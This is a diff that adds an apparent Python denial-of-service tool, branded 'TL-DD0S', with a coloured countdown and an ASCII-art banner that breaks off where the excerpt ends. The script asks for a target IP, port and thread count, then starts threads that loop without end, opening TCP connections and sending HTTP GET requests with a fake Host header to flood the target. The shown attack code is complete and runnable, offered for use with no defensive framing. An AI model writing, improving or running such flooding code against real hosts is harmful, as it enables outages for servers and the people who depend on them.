@@ -1,17 +1,68 @@
+#!/usr/bin/python3
 import os
-import sys
-import requests
+import socket
 import threading
-import random
+import time
 import fade
+from colorama import Fore, Style
+def ddos():
+    os.system("clear")
+    print("press CTRL + C and press ENTER to exit !!!")
+    while True:
+        try:
+            threads = int(input("ENTER NUMBER OF THREADS : "))
+        except ValueError:
+            print("please enter a integer value")
+            continue;
+        else:
+            break;
+    attack_num = 0
+    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    fake = '192.178.1.38'
+    #port = 80( default http port is 80)
+    while True:
+        try:
+            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
+        except ValueError:
+            print("Please enter a valid port , please try again")
+            continue;
+        else:
+            break;
+    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
+    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
+   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
+    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    time.sleep(4)
+    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print("seconds : 3")
+    time.sleep(1)
+    print("seconds : 2")
+    time.sleep(1)
+    print("seconds : 1")
+    time.sleep(1)
 
-if os.name == "nt":  
-    os.system("cls")
-else:  
-     os.system("clear")
+    def attack():
+        nonlocal attack_num
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((trget, port))
+                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
+                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
+                attack_num += 1
+                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+            except socket.error:
+                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
+                break
+                s.close()
 
-logo = """
+    for i in range(threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+def print_red_centered_art():
+    os.system("clear")
+    art = '''
 ══════════════════════════════════════════════════════════════════
                                                                   
   ╔═══╗ ╔═══╗ ╔═══════╗ ╔═╗       ╔═══════╗  ╔══════╗ ╔═╗ ╔═══╗   
